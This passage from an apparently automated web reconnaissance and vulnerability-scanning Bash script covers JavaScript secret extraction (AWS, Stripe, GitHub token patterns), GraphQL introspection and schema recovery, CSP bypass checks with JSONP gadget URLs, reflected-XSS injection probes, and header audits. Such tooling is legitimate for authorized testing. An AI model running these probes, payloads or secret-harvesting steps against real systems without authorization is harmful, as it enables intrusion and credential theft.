  grep -Eoi '(AKIA[0-9A-Z]{16})' "$JS_DOWNLOAD_DIR"/*.js 2>/dev/null | \
    awk -F: '{print "{\"type\":\"AWS_Access_Key\",\"file\":\""$1"\",\"secret\":\""$2"\"}"}' >> "$JS_DIR/secrets.jsonl" || true
  
  grep -Eoi '(AIza[0-9A-Za-z-_]{35})' "$JS_DOWNLOAD_DIR"/*.js 2>/dev/null | \
    awk -F: '{print "{\"type\":\"Google_API_Key\",\"file\":\""$1"\",\"secret\":\""$2"\"}"}' >> "$JS_DIR/secrets.jsonl" || true
  
  grep -Eoi '(sk_live_[0-9a-zA-Z]{24})' "$JS_DOWNLOAD_DIR"/*.js 2>/dev/null | \
    awk -F: '{print "{\"type\":\"Stripe_Secret_Key\",\"file\":\""$1"\",\"secret\":\""$2"\"}"}' >> "$JS_DIR/secrets.jsonl" || true

  grep -Eoi '(xox[baprs]-[0-9a-zA-Z]{10,})' "$JS_DOWNLOAD_DIR"/*.js 2>/dev/null | \
    awk -F: '{print "{\"type\":\"Slack_Token\",\"file\":\""$1"\",\"secret\":\""$2"\"}"}' >> "$JS_DIR/secrets.jsonl" || true

  grep -Eoi '(ghp_[0-9a-zA-Z]{36})' "$JS_DOWNLOAD_DIR"/*.js 2>/dev/null | \
    awk -F: '{print "{\"type\":\"GitHub_PAT\",\"file\":\""$1"\",\"secret\":\""$2"\"}"}' >> "$JS_DIR/secrets.jsonl" || true

  # --- Step 9.7: DOM XSS Sink Extraction ---
  grep -Eni '(eval\(|innerHTML\s*=|document\.write\(|postMessage\(|setTimeout\(.*eval|Function\()' "$JS_DOWNLOAD_DIR"/*.js 2>/dev/null > "$JS_DIR/dom-sinks.txt" || true
  log "  ↳ DOM XSS Sinks identified: $(count "$JS_DIR/dom-sinks.txt")"

  # --- Step 9.8: WebSocket & GraphQL & CSP Endpoint Categorization ---
  grep -Eoi 'wss?://[a-zA-Z0-9.-]+(:[0-9]+)?' "$JS_DOWNLOAD_DIR"/*.js 2>/dev/null | sort -u > "$JS_DIR/websockets.txt" || true
  grep -Eoi 'https?://[a-zA-Z0-9.-]+/[a-zA-Z0-9_./-]*graphql[a-zA-Z0-9_./-]*' "$JS_DOWNLOAD_DIR"/*.js 2>/dev/null | sort -u >> "$JS_DIR/endpoints.txt" || true
  grep -Eoi '[a-zA-Z0-9.-]+\.(s3|amazonaws|blob.core.windows.net|storage.googleapis.com|firebaseio.com)' "$JS_DOWNLOAD_DIR"/*.js 2>/dev/null | sort -u > "$JS_DIR/csp-domains.txt" || true

  # --- Step 9.9: TruffleHog Verified Secret Scanning ---
  if have trufflehog; then
    log "  ↳ Verified secret scan on JS bundles (trufflehog)..."
    trufflehog filesystem "$JS_DOWNLOAD_DIR" --only-verified --json 2>/dev/null > "$JS_DIR/trufflehog-secrets.jsonl" || true
    log "  ↳ trufflehog verified secrets: $(count "$JS_DIR/trufflehog-secrets.jsonl")"
  fi

  # Clean downloaded temporary JS files to save disk space
  rm -rf "$JS_DOWNLOAD_DIR" 2>/dev/null || true

  # --- Step 9.10: Re-probe JS-Discovered Endpoints & Merge into URL Pipeline ---
  if [[ -s "$JS_DIR/endpoints.txt" ]]; then
    sort -u "$JS_DIR/endpoints.txt" -o "$JS_DIR/endpoints.txt"
    in_scope < "$JS_DIR/endpoints.txt" | grep -E '^https?://' 2>/dev/null | sort -u > "$JS_DIR/endpoints-inscope.txt" || true
    
    if [[ -s "$JS_DIR/endpoints-inscope.txt" ]] && have httpx; then
      log "Re-probing JS-discovered endpoints with httpx..."
      httpx -l "$JS_DIR/endpoints-inscope.txt" -silent "${HDR_ARGS[@]}" -o "$JS_DIR/endpoints-live.txt" 2>/dev/null || true
      if [[ -s "$JS_DIR/endpoints-live.txt" ]]; then
        before=$(count "$OUT/urls/all.txt")
        cat "$JS_DIR/endpoints-live.txt" >> "$OUT/urls/all.txt"
        sort -u "$OUT/urls/all.txt" -o "$OUT/urls/all.txt"
        after=$(count "$OUT/urls/all.txt")
        log "Merged JS endpoints into URL set: $before → $after URLs (Chained forward to Katana & Nuclei)"
      fi
    fi
  fi
fi
telegram "📜 <b>STEP 9/34 · JavaScript Analysis</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔑 <b>JS Secrets:</b> $(count "$OUT/js/secrets.jsonl") | <b>trufflehog:</b> $(count "$OUT/js/trufflehog-secrets.jsonl")
📌 <b>Endpoints:</b> $(count "$OUT/js/endpoints.txt") | <b>DOM Sinks:</b> $(count "$OUT/js/dom-sinks.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

# Storage saver: JS re-probe intermediates were already merged into urls/all.txt.
# (The raw JS bodies in js/_download are cleaned by the trufflehog block itself.)
prune_paths "$OUT/js/endpoints-inscope.txt" "$OUT/js/endpoints-live.txt"

###############################################################################
# 10. GraphQL discovery + introspection + audit
###############################################################################
log "Discovering GraphQL endpoints"
if ! grep -qiE 'graphql|graphiql|/gql|apollo|hasura' "$OUT/http/httpx.jsonl" "$OUT/http/tech-stack.txt" "$OUT/urls/all.txt" 2>/dev/null; then
  log "  ↳ Smart Routing: No GraphQL endpoints or headers detected — skipping heavy GraphQL probes"
  : > "$OUT/graphql/live.txt"
  : > "$OUT/graphql/introspection-enabled.txt"
else
  {
    grep -Eai 'graphql|graphiql|/gql|/query|/api/graph' "$OUT/urls/all.txt" 2>/dev/null || true
    while IFS= read -r base; do
      # Clean base URL of existing graphql path suffixes to prevent /graphql/graphql duplicates
      clean_base=$(printf '%s' "$base" | sed -E 's#/(graphql|graphiql|gql|query|api/graphql|api/gql)/?$##i; s#/$##')
      for p in /graphql /graphql/console /graphiql /v1/graphql /api/graphql /query /gql /api/gql; do
        printf '%s%s\n' "$clean_base" "$p"
      done
    done < "$OUT/http/live-urls.txt"
  } | awk 'NF && !seen[$0]++' > "$OUT/graphql/candidates.txt"
  : > "$OUT/graphql/live.txt"
  while IFS= read -r url; do
    resp="$(curl -fsS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" -X POST -H 'Content-Type: application/json' "${CURL_HDR[@]}" --data '{"query":"{__typename}"}' "$url" 2>/dev/null || true)"
    if printf '%s' "$resp" | grep -qiE '"__typename"|"data"|"errors".*(query|graphql|must)'; then
      printf '%s\n' "$url" >> "$OUT/graphql/live.txt"; log "GraphQL endpoint: $url"
    fi
  done < "$OUT/graphql/candidates.txt"
fi
if [[ "$MODE" == "full" ]]; then
  INTRO_Q='{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { kind name fields(includeDeprecated:true){ name args{ name } type{ kind name ofType{ kind name } } } } directives{ name } } }"}'
  while IFS= read -r url; do
    safe="$(printf '%s' "$url" | sed 's,[^a-zA-Z0-9],_,g')"
    out="$OUT/graphql/introspection_${safe}.json"
    curl -fsS --max-time 20 -X POST -H 'Content-Type: application/json' "${CURL_HDR[@]}" --data "$INTRO_Q" "$url" 2>/dev/null > "$out" || true
    if grep -q '"__schema"' "$out" 2>/dev/null; then
      notify_verified "GraphQL Introspection Enabled" "$url" \
        "Live __schema response permits schema enumeration" graphql
      [[ "$VF_VERDICT" == "VERIFIED" ]] && printf '%s\n' "$url" >> "$OUT/graphql/introspection-enabled.txt"
    fi
  done < "$OUT/graphql/live.txt"
fi
if [[ -s "$OUT/graphql/live.txt" ]]; then
  nuclei -l "$OUT/graphql/live.txt" -tags graphql -severity info,low,medium,high,critical "${HDR_ARGS[@]}" -jsonl -o "$OUT/graphql/nuclei-graphql.jsonl" || true
fi
if have graphql-cop; then
  while IFS= read -r url; do
    safe="$(printf '%s' "$url" | sed 's,[^a-zA-Z0-9],_,g')"
    graphql-cop -t "$url" -o json > "$OUT/graphql/cop_${safe}.json" 2>/dev/null || true
  done < "$OUT/graphql/live.txt"
fi

# --- clairvoyance: recover schema when introspection is DISABLED ----------
# If a GraphQL endpoint is live but introspection is off, clairvoyance abuses
# field-suggestion error messages to rebuild the schema. Runs only on live
# endpoints that are NOT in the introspection-enabled list. Installed via
# setup.sh but was previously never invoked.
if have clairvoyance && [[ -s "$OUT/graphql/live.txt" ]]; then
  # Small built-in wordlist so no external dependency is required.
  CLV_WL="$OUT/graphql/clairvoyance-wordlist.txt"
  if [[ ! -s "$CLV_WL" ]]; then
    printf '%s\n' id name title user users account accounts email password \
      token role roles admin isAdmin query mutation node nodes edge edges \
      first last page limit offset search filter create update delete get \
      list find me profile session key secret data value type status \
      > "$CLV_WL"
  fi
  clv_ran=0
  while IFS= read -r url; do
    grep -qxF "$url" "$OUT/graphql/introspection-enabled.txt" 2>/dev/null && continue
    safe="$(printf '%s' "$url" | sed 's,[^a-zA-Z0-9],_,g')"
    log "clairvoyance: recovering schema (introspection disabled) → $url"
    clairvoyance -w "$CLV_WL" -o "$OUT/graphql/clairvoyance_${safe}.json" "$url" 2>/dev/null || true
    clv_ran=$((clv_ran+1))
  done < "$OUT/graphql/live.txt"
  [[ "$clv_ran" -gt 0 ]] && log "clairvoyance attempted on $clv_ran endpoint(s)"
else
  have clairvoyance || warn "clairvoyance not installed — skipping schema recovery (optional)"
fi
log "GraphQL: $(count "$OUT/graphql/live.txt") live | introspection open: $(count "$OUT/graphql/introspection-enabled.txt")"
telegram "🔮 <b>STEP 10/34 · GraphQL Discovery &amp; Audit</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
📊 <b>Live GraphQL:</b> $(count "$OUT/graphql/live.txt") | <b>Introspection Open:</b> $(count "$OUT/graphql/introspection-enabled.txt")" "HTML"

###############################################################################
# 11. Advanced CSP Evaluation & Bypass Surface Detection + Exploit Chain
###############################################################################
if [[ "$MODE" != "full" ]]; then
  log "Safe mode: skipping active CSP bypass and exploit-chain testing (use --full when authorized)"
else
log "Analyzing Content-Security-Policy (Advanced Evaluator Engine v2)"
: > "$OUT/csp/report.txt"
: > "$OUT/csp/bypasses.txt"
: > "$OUT/csp/exploit-chains.txt"
: > "$OUT/csp/jsonp-gadgets.txt"
: > "$OUT/csp/clickjacking.txt"

# Known JSONP callback endpoints on popular CDNs (used for CSP bypass → XSS)
JSONP_GADGETS=(
  "https://accounts.google.com/o/oauth2/revoke?callback=CALLBACK"
  "https://www.google.com/complete/search?client=chrome&q=apex&callback=CALLBACK"
  "https://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=test&callback=CALLBACK"
  "https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"
)

# Cloud storage / user-uploadable content domains (attacker can host payloads)
CLOUD_STORAGE_REGEX='(s3\.amazonaws\.com|s3[-.].*\.amazonaws\.com|storage\.googleapis\.com|blob\.core\.windows\.net|firebasestorage\.googleapis\.com|digitaloceanspaces\.com|\.r2\.dev|\.supabase\.co/storage)'

while IFS= read -r u; do
  hdr="$(curl -fsSIL --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" "${CURL_HDR[@]}" "$u" 2>/dev/null || true)"
  csp="$(printf '%s' "$hdr" | grep -i '^content-security-policy:' | head -1)"
  csp_ro="$(printf '%s' "$hdr" | grep -i '^content-security-policy-report-only:' | head -1)"

  # --- Check 0: Report-Only Mode (NO enforcement at all!) ---
  if [[ -z "$csp" && -n "$csp_ro" ]]; then
    printf 'CSP_REPORT_ONLY\t%s\tCSP is Report-Only (NOT enforced!)\n' "$u" >> "$OUT/csp/report.txt"
    printf '%s\tCSP Report-Only: Policy exists but is NOT enforced — all payloads execute freely\n' "$u" >> "$OUT/csp/bypasses.txt"
    # Recorded for the exploit-chain phase below, but NOT alerted: a report-only
    # CSP on its own is not a reportable finding. It only becomes an alert if the
    # chain phase confirms an actual reflected XSS on this page (operator policy).
    warn "CSP Report-Only (NO enforcement): $u — recorded, not alerted (needs a confirmed chain)"
    continue
  fi

  if [[ -z "$csp" ]]; then
    printf 'MISSING_CSP\t%s\n' "$u" >> "$OUT/csp/report.txt"
    continue
  fi

  flags=()
  bypasses=()

  # --- 1. Unsafe Directives ---
  printf '%s' "$csp" | grep -qi "unsafe-inline" && flags+=("unsafe-inline")
  printf '%s' "$csp" | grep -qi "unsafe-eval"   && flags+=("unsafe-eval")
  printf '%s' "$csp" | grep -qi "data:"          && flags+=("data-uri")

  # --- 2. Wildcard Sources (*.example.com or * alone) ---
  # Detect both full wildcard (*) and subdomain wildcards (*.cdn.com)
  if printf '%s' "$csp" | grep -qiE "(^|[ ;])script-src[^;]*[ ']?\*[ ';]"; then
    flags+=("script-src-wildcard")
    bypasses+=("script-src allows wildcard * — load scripts from ANY domain")
  fi
  if printf '%s' "$csp" | grep -qiE '\*\.[a-z]'; then
    flags+=("subdomain-wildcard")
    bypasses+=("Subdomain wildcard in CSP — attacker-controlled subdomain can serve payloads")
  fi

  # --- 3. Whitelisted Known CDN/JSONP Gadgets ---
  if printf '%s' "$csp" | grep -qiE "(cdnjs\.cloudflare\.com|raw\.githubusercontent\.com|accounts\.google\.com|ajax\.googleapis\.com|cdn\.jsdelivr\.net|unpkg\.com|gstatic\.com)"; then
    flags+=("whitelisted-cdn-gadget")
    bypasses+=("Known JSONP/Angular CDN Gadget whitelisted — script execution via callback")
    # Identify WHICH gadget is whitelisted for targeted exploitation
    for gadget_domain in cdnjs.cloudflare.com accounts.google.com ajax.googleapis.com cdn.jsdelivr.net unpkg.com; do
      if printf '%s' "$csp" | grep -qi "$gadget_domain"; then
        printf '%s\t%s\n' "$u" "$gadget_domain" >> "$OUT/csp/jsonp-gadgets.txt"
      fi
    done
  fi

  # --- 4. Cloud Storage Domains (attacker-uploadable script hosting) ---
  if printf '%s' "$csp" | grep -qiE "$CLOUD_STORAGE_REGEX"; then
    flags+=("cloud-storage-allowed")
    bypasses+=("Cloud storage domain whitelisted — attacker can upload and serve malicious JS from their own bucket")
  fi

  # --- 5. Missing base-uri (Base Tag Hijacking) ---
  if ! printf '%s' "$csp" | grep -qi "base-uri"; then
    flags+=("missing-base-uri")
    # Only flag as bypass if there's also a way to inject HTML (unsafe-inline or missing CSP for default)
    if printf '%s' "$csp" | grep -qiE 'unsafe-inline|data:'; then
      bypasses+=("Missing base-uri + unsafe-inline → Base Tag Hijacking for relative script theft")
    fi
  fi

  # --- 6. Missing object-src (Plugin Injection) ---
  if ! printf '%s' "$csp" | grep -qi "object-src"; then
    if ! printf '%s' "$csp" | grep -qiE "default-src[^;]*(none|'self')"; then
      flags+=("missing-object-src")
      bypasses+=("Missing object-src without restrictive default-src — Flash/Plugin injection possible")
    fi
  fi

  # --- 7. Missing frame-ancestors (Clickjacking) ---
  if ! printf '%s' "$csp" | grep -qi "frame-ancestors"; then
    xfo="$(printf '%s' "$hdr" | grep -i '^x-frame-options:' | head -1)"
    if [[ -z "$xfo" ]]; then
      flags+=("clickjacking")
      printf '%s\tNo frame-ancestors + No X-Frame-Options\n' "$u" >> "$OUT/csp/clickjacking.txt"
      bypasses+=("Clickjacking: No frame-ancestors CSP + No X-Frame-Options header")
    fi
  fi

  # --- 8. strict-dynamic without nonce/hash (renders whitelist useless but still exploitable) ---
  if printf '%s' "$csp" | grep -qi "strict-dynamic"; then
    if ! printf '%s' "$csp" | grep -qiE "(nonce-|sha256-|sha384-|sha512-)"; then
      flags+=("strict-dynamic-no-nonce")
      bypasses+=("strict-dynamic without nonce/hash — DOM gadgets can chain script execution")
    fi
  fi

  # --- 9. style-src unsafe-inline (CSS Injection → Data Exfiltration) ---
  if printf '%s' "$csp" | grep -qiE "style-src[^;]*unsafe-inline"; then
    flags+=("css-injection")
    bypasses+=("style-src unsafe-inline — CSS Injection for token/data exfiltration via attribute selectors")
  fi

  # --- 10. Insecure HTTP Scheme in HTTPS Context ---
  if printf '%s' "$csp" | grep -qi "http://"; then
    flags+=("http-scheme-allowed")
    bypasses+=("Insecure http:// scheme whitelisted — MITM can inject scripts")
  fi

  # --- 11. script-src 'self' with file upload (if site allows uploads) ---
  # This is detected later in exploit chain phase

  if [[ ${#flags[@]} -gt 0 ]]; then
    printf 'WEAK_CSP\t%s\tFlags:%s\n' "$u" "$(IFS=,; echo "${flags[*]}")" >> "$OUT/csp/report.txt"
    if [[ ${#bypasses[@]} -gt 0 ]]; then
      printf '%s\t%s\n' "$u" "$(IFS=' | '; echo "${bypasses[*]}")" >> "$OUT/csp/bypasses.txt"
      # CSP weaknesses are recorded so the exploit-chain phase below can try to
      # chain them into a real bug. A CSP bypass ALONE is never alerted or counted
      # as a finding — only a confirmed chain (reflected XSS, live JSONP gadget)
      # fires notify_alert. (operator policy: no CSP-only reports/alerts)
      warn "CSP weakness recorded (not alerted): $u -> ${bypasses[*]}"
    fi
  fi
done < "$OUT/http/live-urls.txt"

log "CSP: $(grep -c MISSING_CSP "$OUT/csp/report.txt" 2>/dev/null || echo 0) missing, $(grep -c WEAK_CSP "$OUT/csp/report.txt" 2>/dev/null || echo 0) weak, $(count "$OUT/csp/bypasses.txt") bypass vectors, $(count "$OUT/csp/clickjacking.txt") clickjacking"

# ---------------------------------------------------------------------------
# 11b. CSP Exploit Chain Verification (Bypass → Confirmed Bug)
# ---------------------------------------------------------------------------
# CSP bypass alone is NOT a vulnerability. This phase chains CSP weaknesses
# with actual injection sinks to produce CONFIRMED, REPORTABLE findings:
#   - CSP bypass + reflected parameter = Verified XSS
#   - CSP bypass + JSONP gadget = Verified script execution
#   - Missing frame-ancestors = Verified clickjacking
#   - Report-Only CSP + any injection = Verified (no enforcement)
# ---------------------------------------------------------------------------
log "CSP Exploit Chain: Verifying bypass → confirmed vulnerability"
: > "$OUT/csp/verified-exploits.txt"

# --- Chain 1: JSONP Gadget Verification ---
# Test if whitelisted JSONP endpoints actually return executable callbacks
if [[ -s "$OUT/csp/jsonp-gadgets.txt" ]]; then
  log "Testing JSONP gadget exploitability on whitelisted CDNs"
  while IFS=$'\t' read -r page_url gadget_domain; do
    for gadget_url in "${JSONP_GADGETS[@]}"; do
      # Only test gadgets matching the whitelisted domain
      if printf '%s' "$gadget_url" | grep -qi "$gadget_domain"; then
        test_url="${gadget_url//CALLBACK/apex_csp_test}"
        resp="$(curl -fsS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" "$test_url" 2>/dev/null || true)"
        # If response contains our callback function name, the JSONP gadget is LIVE
        if printf '%s' "$resp" | grep -qF "apex_csp_test"; then
          printf 'JSONP_GADGET_LIVE\t%s\tGadget: %s\tCallback executes on: %s\n' \
            "$page_url" "$test_url" "$gadget_domain" >> "$OUT/csp/verified-exploits.txt"
          warn "✅ JSONP Gadget LIVE: $gadget_domain → exploitable on $page_url"
          notify_alert "CSP Bypass → XSS (JSONP Gadget Confirmed)" "$page_url" \
            "Whitelisted JSONP gadget is LIVE: $test_url | Inject: <script src='$test_url'></script>"
          break
        fi
      fi
    done
  done < "$OUT/csp/jsonp-gadgets.txt"
fi

# --- Chain 2: Reflected Parameter + Weak CSP = Confirmed XSS ---
# For pages with unsafe-inline or missing/report-only CSP, inject a marker that
# carries raw HTML metacharacters ("><x, sent URL-encoded). We only confirm when
# the RAW markup survives un-encoded in the body — that proves the value lands in
# an HTML sink without encoding (real injection), not just harmless text
# reflection. Confirmed markup survival + a CSP weakness = reportable XSS chain.
MARK="apxr3c0n$(date +%s | tail -c 6)"
# Sent value: <MARK>"><x  (transport-safe: %22%3E%3Cx decodes server-side to "><x)
INJ_ENC="${MARK}%22%3E%3Cx"
# What must appear verbatim in the response for a confirmed HTML-context injection
SURV="${MARK}\"><x"

if [[ -s "$OUT/csp/bypasses.txt" ]]; then
  log "Testing markup-survival + CSP bypass = confirmed XSS chain"
  while IFS=$'\t' read -r page_url _bypass_info; do
    # Skip if no query parameters
    printf '%s' "$page_url" | grep -qE '\?' || continue

    # Extract parameter names from URL
    param_part="${page_url#*\?}"
    # Test each parameter for reflection
    IFS='&' read -ra params <<< "$param_part"
    for param in "${params[@]}"; do
      pname="${param%%=*}"
      [[ -z "$pname" ]] && continue

      # Build test URL with the markup-carrying marker in this parameter
      if have qsreplace; then
        test_url="$(printf '%s\n' "$page_url" | qsreplace "$INJ_ENC" 2>/dev/null)"
      else
        test_url="$(printf '%s' "$page_url" | sed "s|${pname}=[^&]*|${pname}=${INJ_ENC}|")"
      fi

      resp_body="$(curl -fsS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" "${CURL_HDR[@]}" "$test_url" 2>/dev/null || true)"

      # CONFIRM: raw markup ("><x) survived un-encoded. If the app HTML-encoded it
      # (&quot;&gt;&lt;x) or echoed the %-encoded form, grep -F fails → not a vuln.
      if printf '%s' "$resp_body" | grep -qF "$SURV"; then
        # Reflection context (the angle brackets already landed → real HTML sink)
        ctx="HTML-injection"
        if printf '%s' "$resp_body" | grep -qiE "<script[^>]*>[^<]*${MARK}"; then
          ctx="JavaScript-block"
        fi

        # Check what CSP weakness applies to this page
        csp_weakness=""
        if grep -qF "$page_url" <<< "$(grep 'CSP_REPORT_ONLY\|MISSING_CSP' "$OUT/csp/report.txt" 2>/dev/null)"; then
          csp_weakness="NO_CSP_ENFORCEMENT"
        elif grep -qF "$page_url" <<< "$(grep 'unsafe-inline' "$OUT/csp/report.txt" 2>/dev/null)"; then
          csp_weakness="unsafe-inline"
        elif grep -qF "$page_url" <<< "$(grep 'whitelisted-cdn-gadget\|cloud-storage\|script-src-wildcard' "$OUT/csp/report.txt" 2>/dev/null)"; then
          csp_weakness="script-src-bypass"
        fi

        if [[ -n "$csp_weakness" ]]; then
          printf 'CSP_XSS_CHAIN\t%s\tParam=%s\tContext=%s\tCSP_Weakness=%s\tPoC=%s\n' \
            "$page_url" "$pname" "$ctx" "$csp_weakness" "$test_url" >> "$OUT/csp/verified-exploits.txt"
          warn "✅ CSP EXPLOIT CHAIN: markup survived on $pname ($ctx) + $csp_weakness on $page_url"
          notify_alert "CSP Bypass → XSS CONFIRMED" "$test_url" \
            "Param: $pname injects raw HTML ($ctx) — markup survived un-encoded | CSP Weakness: $csp_weakness | This is a REPORTABLE XSS"
          break  # One confirmed param per URL is enough
        fi
      fi
    done
  done < "$OUT/csp/bypasses.txt"
fi

# --- Chain 3: Clickjacking (recorded only — NOT a confirmed exploit chain) ---
# Missing frame-ancestors/X-Frame-Options is a header-only issue, not a CSP bug
# chained to a confirmed exploit, so per operator policy it is NEVER alerted and
# is NOT written to verified-exploits.txt (which feeds the findings digest). We
# only prune the candidate list down to framable 200 pages so the HTML report's
# Clickjacking table is accurate (a 3xx page redirects away and can't be framed).
if [[ -s "$OUT/csp/clickjacking.txt" ]]; then
  log "Filtering clickjacking candidates to framable 200 pages (recorded, not alerted)"
  _cjtmp="$(mktemp)"
  while IFS=$'\t' read -r click_url click_info; do
    [[ -z "$click_url" ]] && continue
    resp_code="$(curl -fsS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" -o /dev/null -w '%{http_code}' "${CURL_HDR[@]}" "$click_url" 2>/dev/null || echo 000)"
    if [[ "$resp_code" == "200" ]]; then
      printf '%s\t%s\n' "$click_url" "${click_info:-No frame-ancestors + No X-Frame-Options}" >> "$_cjtmp"
    fi
  done < "$OUT/csp/clickjacking.txt"
  mv -f "$_cjtmp" "$OUT/csp/clickjacking.txt" 2>/dev/null || rm -f "$_cjtmp"
fi

# --- Chain 4: Base Tag Hijacking Verification ---
# If base-uri is missing AND page uses relative script/link paths, base tag
# injection can redirect all relative resource loads to attacker-controlled server
if [[ -s "$OUT/csp/bypasses.txt" ]]; then
  log "Checking for base tag hijacking vectors"
  grep -l "missing-base-uri" "$OUT/csp/report.txt" 2>/dev/null | head -5 | while IFS= read -r _; do
    grep "missing-base-uri" "$OUT/csp/report.txt" | awk -F'\t' '{print $2}' | head -10 | while IFS= read -r base_url; do
      body="$(curl -fsS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" "${CURL_HDR[@]}" "$base_url" 2>/dev/null || true)"
      # Check for relative script src (not starting with http//)
      if printf '%s' "$body" | grep -qiE '<script[^>]+src=["\x27](?!https?://|//)'; then
        # Precondition only (relative <script> + missing base-uri). This is a
        # POSSIBLE vector, not a confirmed exploit — recorded to its own file
        # (NOT verified-exploits.txt) and never alerted, per operator policy.
        printf 'BASE_TAG_VECTOR\t%s\tRelative <script src> found + missing base-uri\n' \
          "$base_url" >> "$OUT/csp/base-tag-vectors.txt"
        warn "Base tag hijack vector (recorded, not alerted): $base_url"
      fi
    done
  done
fi

EXPLOIT_COUNT=$(count "$OUT/csp/verified-exploits.txt")
log "CSP Exploit Chains: $EXPLOIT_COUNT verified exploitable findings"
set_checkpoint 11

telegram "🛡️ <b>STEP 11/34 · CSP Advanced Evaluation</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
⚠️ <b>Weak CSP:</b> $(grep -c WEAK_CSP "$OUT/csp/report.txt" 2>/dev/null || echo 0) | <b>Bypass Vectors:</b> $(count "$OUT/csp/bypasses.txt")
🔥 <b>Verified Exploit Chains:</b> ${EXPLOIT_COUNT} | <b>Clickjacking:</b> $(count "$OUT/csp/clickjacking.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

fi
###############################################################################
# 12. Security Header Audit (HSTS, X-Content-Type-Options, Referrer-Policy, Cookie Flags)
###############################################################################
if ! is_step_done 12; then
  if [[ "$MODE" != "full" ]]; then
    log "Safe mode: skipping authenticated security-header and cookie audit"
  else
  log "Auditing Security Headers (HSTS, X-Content-Type, Cookie flags, Referrer Policy)"
  : > "$OUT/headers/audit.txt"
  : > "$OUT/headers/vulnerable-cookies.txt"

  while IFS= read -r u; do
    hdr="$(curl -fsSIL --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" "${CURL_HDR[@]}" "$u" 2>/dev/null || true)"
    
    # Check HSTS
    if ! printf '%s' "$hdr" | grep -qi '^strict-transport-security:'; then
      printf 'MISSING_HSTS\t%s\tMissing HSTS header — vulnerable to SSL strip/MITM\n' "$u" >> "$OUT/headers/audit.txt"
    fi

    # Check X-Content-Type-Options
    if ! printf '%s' "$hdr" | grep -qi '^x-content-type-options:[[:space:]]*nosniff'; then
      printf 'MISSING_NOSNIFF\t%s\tMissing nosniff header — MIME sniffing vector\n' "$u" >> "$OUT/headers/audit.txt"
    fi

    # Check Referrer-Policy
    if ! printf '%s' "$hdr" | grep -qi '^referrer-policy:'; then
      printf 'MISSING_REFERRER_POLICY\t%s\tMissing Referrer-Policy — token leakage via Referer header\n' "$u" >> "$OUT/headers/audit.txt"
    fi

    # Check Cookie Flags (Secure, HttpOnly, SameSite)
    set_cookie_hdrs="$(printf '%s' "$hdr" | grep -i '^set-cookie:')"
    if [[ -n "$set_cookie_hdrs" ]]; then
      while IFS= read -r cookie_line; do
        missing_flags=()
        printf '%s' "$cookie_line" | grep -qi 'secure'   || missing_flags+=("Secure")
        printf '%s' "$cookie_line" | grep -qi 'httponly' || missing_flags+=("HttpOnly")
        printf '%s' "$cookie_line" | grep -qi 'samesite' || missing_flags+=("SameSite")

        if [[ ${#missing_flags[@]} -gt 0 ]]; then
          printf 'WEAK_COOKIE_FLAGS\t%s\tCookie: %s\tMissing: %s\n' \
            "$u" "$cookie_line" "$(IFS=,; echo "${missing_flags[*]}")" >> "$OUT/headers/vulnerable-cookies.txt"
          warn "Weak Cookie Flags on $u: Missing ${missing_flags[*]} (recorded locally, not alerting — not exploitable alone)"
        fi
      done <<< "$set_cookie_hdrs"
    fi
  done < "$OUT/http/live-urls.txt"

  log "Security Header Audit: $(count "$OUT/headers/audit.txt") header gaps, $(count "$OUT/headers/vulnerable-cookies.txt") weak cookies"
  fi
  set_checkpoint 12
fi
telegram "🔒 <b>STEP 12/34 · Security Header Audit</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
⚠️ <b>Header Gaps:</b> $(count "$OUT/headers/audit.txt") | <b>Weak Cookies:</b> $(count "$OUT/headers/vulnerable-cookies.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 13. Screenshots (full mode)
###############################################################################
if ! is_step_done 13; then
  if have gowitness && [[ "$MODE" == "full" ]]; then
    log "Screenshotting live hosts (gowitness)"
    gowitness scan file -f "$OUT/http/live-urls.txt" --screenshot-path "$OUT/screens" --write-none 2>/dev/null || true
  fi
  set_checkpoint 13
fi
telegram "📸 <b>STEP 13/34 · Screenshots</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🖼️ <b>Mode:</b> ${MODE}
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 14. Industrial Content Discovery & Tech-Aware Fuzzing Engine
###############################################################################
if ! is_step_done 14; then
  mkdir -p "$OUT/content" "$OUT/exposed"
  : > "$OUT/exposed/findings.txt"
  : > "$OUT/content/robots-sitemap-urls.txt"

  # --- Step 14.1: robots.txt & sitemap.xml Parsing Engine ---
  log "Parsing robots.txt & sitemap.xml across live hosts..."
  while IFS= read -r base || [[ -n "$base" ]]; do
    [[ -z "$base" ]] && continue
    b="${base%/}"
    
    # robots.txt
    r_body="$(curl -fsSL --connect-timeout 4 --max-time 8 "$b/robots.txt" 2>/dev/null || true)"
    if [[ -n "$r_body" ]]; then
      grep -iE '^(Disallow|Allow):' <<< "$r_body" | awk '{print $2}' | while read -r path; do
        [[ -n "$path" && "$path" != "/" ]] && printf "%s%s\n" "$b" "$path" >> "$OUT/content/robots-sitemap-urls.txt"
      done
    fi
    
    # sitemap.xml
